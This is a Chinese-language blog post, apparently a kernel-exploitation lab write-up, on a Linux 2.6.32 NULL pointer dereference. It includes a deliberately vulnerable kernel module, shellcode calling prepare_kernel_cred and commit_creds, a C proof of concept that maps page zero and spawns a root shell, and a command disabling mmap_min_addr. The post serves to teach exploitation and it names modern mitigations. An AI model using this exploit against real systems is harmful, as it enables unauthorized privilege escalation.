---
title: 'Kernel Exploit: NULL Dereference'
date: 2017-05-13 03:02:14
tags:
- kernel exploit
- null pointer
categories:
- kernel_exploit
---
环境都搭好了，美滋滋，接下来就是做kernel exploit的实验了。

这个类型的漏洞比较简单，就是空指针处理不当引起的。其实这只是指针解引用的一种情况而已。但现在这种NULL指针解引用基本已经很难利用了，mmap_min_addr就防止map low address。
<!-- more -->
### Example
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>

void (*my_funptr)(void);

int bug1_write(struct file *file, const char *buf, unsigned long len)
{
    my_funptr();
    return len;
}

static int init_func(void)
{
    printk(KERN_ALERT "null_dereference driver init!\n");
    create_proc_entry("bug1", 0666, 0)->write_proc = bug1_write;
    return 0;
}

static void exit_func(void)
{
    printk(KERN_ALERT "null_dereference driver exit\n");
}

module_init(init_func);
module_exit(exit_func);

/*Makefile*/
obj-m := null.o 
KERNELDIR := /lib/modules/2.6.32.21/build
PWD := $(shell pwd) 
modules: 
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules 
modules_install: 
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules_install
```

当想/proc/bug1中写入时，会触发bug1_write函数，然后就会执行my_funptr，但是由于未初始化所以是NULL值，所以会出现问题。
```shell
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exp/null_exp$ echo 'fuck' > /proc/bug1
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exp/null_exp$ dmesg
[ 6613.943572] Pid: 3624, comm: bash Tainted: P      D W  (2.6.32.21 #1) VMware Virtual Platform
[ 6613.943573] EIP: 0060:[<00000000>] EFLAGS: 00210202 CPU: 0
[ 6613.943576] EIP is at 0x0
[ 6613.943577] EAX: c1ac4100 EBX: 00000005 ECX: 00000005 EDX: 09021808
[ 6613.943579] ESI: c1ac4100 EDI: 00000005 EBP: c1b11f18 ESP: c1b11f10
[ 6613.943580]  DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068
[ 6613.943581] Process bash (pid: 3624, ti=c1b10000 task=c18a8000 task.ti=c1b10000)
[ 6613.943582] Stack:
[ 6613.943583]  f80f2011 c27bdcc0 c1b11f3c c0249763 00000000 c1b11f78 c27bdd08 09021808
[ 6613.943587] <0> c27bdcc0 c1ac4100 c0249700 c1b11f64 c0244aa7 c1b11f98 c0217bed c27bdd08
[ 6613.943590] <0> 00000005 09021808 c1ac4100 00000005 09021808 c1b11f8c c02016c2 c1b11f98
[ 6613.943594] Call Trace:
[ 6613.943596]  [<f80f2011>] ? bug1_write+0x11/0x18 [null]
[ 6613.943599]  [<c0249763>] ? proc_file_write+0x63/0xa0
[ 6613.943601]  [<c0249700>] ? proc_file_write+0x0/0xa0
[ 6613.943604]  [<c0244aa7>] ? proc_reg_write+0x67/0xa0
[ 6613.943607]  [<c0217bed>] ? alloc_fd+0xbd/0xf0
[ 6613.943611]  [<c02016c2>] ? vfs_write+0xa2/0x1a0
[ 6613.943613]  [<c0244a40>] ? proc_reg_write+0x0/0xa0
[ 6613.943619]  [<c05734e0>] ? do_page_fault+0x160/0x3a0
[ 6613.943621]  [<c0201fe2>] ? sys_write+0x42/0x70
[ 6613.943623]  [<c010315c>] ? sysenter_do_call+0x12/0x28
[ 6613.943624] Code:  Bad EIP value.
[ 6613.943626] EIP: [<00000000>] 0x0 SS:ESP 0068:c1b11f10
[ 6613.943629] CR2: 0000000000000000
[ 6613.943632] ---[ end trace 99d97d6e15005969 ]---
```

### Exploit
基本思路是分配0地址空间，然后拷贝shellcode到这，然后在内核态下运行shellcode，接着返回用户态执行system函数。

首先找到prepare_kernel_cred和commit_creds函数的地址。
```shell
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exp/null_exp$ cat /proc/kallsyms | grep prepare_kernel_cred
c016b2f0 T prepare_kernel_cred
c070d9a8 r __ksymtab_prepare_kernel_cred
c0717204 r __kcrctab_prepare_kernel_cred
c071e0b0 r __kstrtab_prepare_kernel_cred
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exp/null_exp$ cat /proc/kallsyms | grep commit_creds
c016afb0 T commit_creds
c02eae40 T security_commit_creds
c070d9c8 r __ksymtab_commit_creds
c0717214 r __kcrctab_commit_creds
c071e0ec r __kstrtab_commit_creds
```
然后生成shellcode。
```asm
//sc.s
xor %eax, %eax  # %eax := 0
call 0xc016b2f0 # prepare_kernel_cred
call 0xc016afb0 # commit_creds
ret
```
用gcc编译：
```shell
gcc -o sc sc.s -nostdlib -Ttext=0
```
然后提取shellcode：
```shell
w0lfzhang@w0lfzhang666:~/Desktop/kernel_exp/null_exp$ objdump -d sc
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	e8 e9 b2 16 c0       	call   c016b2f0 <_end+0xc016a2e0>
   7:	e8 a4 af 16 c0       	call   c016afb0 <_end+0xc0169fa0>
   c:	c3                   	ret    
```
shellcode已得到，接下来就是Poc了。
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

char payload[] = "\x31\xc0\xe8\xe9\xb2\x16\xc0\xe8\xa4\xaf\x16\xc0\xc3";

int main()
{
    mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS , -1, 0);
    memcpy(0, payload, sizeof(payload));

    int fd = open("/proc/bug1", O_WRONLY);
    write(fd, "foo", 3);
    system("/bin/sh");
    return 0;
}
```
编译执行应该能获得root权限，美滋滋。但我用2.6.32.21的内核版本没成功，后来看了0xmuhe师傅的那篇稿子才知道是mmap_min_addr的原因。
还得执行以下命令：
```shell
root@w0lfzhang666:/home/w0lfzhang/Desktop/kernel_exp/null_exp# sysctl -w vm.mmap_min_addr="0
vm.mmap_min_addr="0
```
这下终于成功了，美滋滋。
```shell
root@w0lfzhang666:/home/w0lfzhang/Desktop/kernel_exp/null_exp# ./exp
# id
uid=0(root) gid=0(root)
```
其实这种漏洞现在几乎是绝种了，就算有还有SMEP(防止内核态执行用户空间代码)防护措施。入门吗，先从简单的看起~~

### Reference
[Writing kernel exploits](https://tc.gtisc.gatech.edu/bss/2014/r/kernel-exploits.pdf)
[【系列分享】Linux 内核漏洞利用教程（二）：两个Demo](http://bobao.360.cn/learning/detail/3702.html)
